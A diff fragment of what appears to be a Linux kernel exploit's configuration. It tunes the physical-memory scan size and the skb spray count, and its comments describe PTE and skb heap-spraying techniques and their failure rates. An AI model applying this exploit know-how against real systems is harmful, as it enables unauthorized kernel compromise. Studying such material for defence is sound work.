@@ -23,7 +23,7 @@
 // - make sure to account for mmio and stuff, considering laptops may utilize a lot of PCIe physical memory
 //   - as a rule of thumb, use 4GiB mmio, because scanning is quick and can't hurt to scan a larger area
 // - exploit may get stuck when kernel base is not found and phys mem is out of bounds, press ctrl-c (it is safe)
-#define CONFIG_PHYS_MEM (0x100000000 + 0x10000000)  // default: 32GiB system ram + 4GiB PCIe mmio and stuff
+#define CONFIG_PHYS_MEM (0x800000000 + 0x100000000)  // default: 32GiB system ram + 4GiB PCIe mmio and stuff
 
 // amount of PTE pages allocated (sprayed) when draining PCP order-0 freelist
 // - increasing bulk amount increases time required to alloc all these PTEs
@@ -36,7 +36,7 @@
 // - not enough skb's lead to kernel panic when kernel encounters corrupted packet in freelist when allocating skb's
 //#define CONFIG_SKB_SPRAY_AMOUNT 1 (12/32 fails)
 //#define CONFIG_SKB_SPRAY_AMOUNT 64 (4/32 fails)
-#define CONFIG_SKB_SPRAY_AMOUNT 174 // (0/651 fails)
+#define CONFIG_SKB_SPRAY_AMOUNT 170 // (0/651 fails)
 
 // only lower when flexing on people
 // - this wait period allows the kernel to make allocations in the background which aren't critical
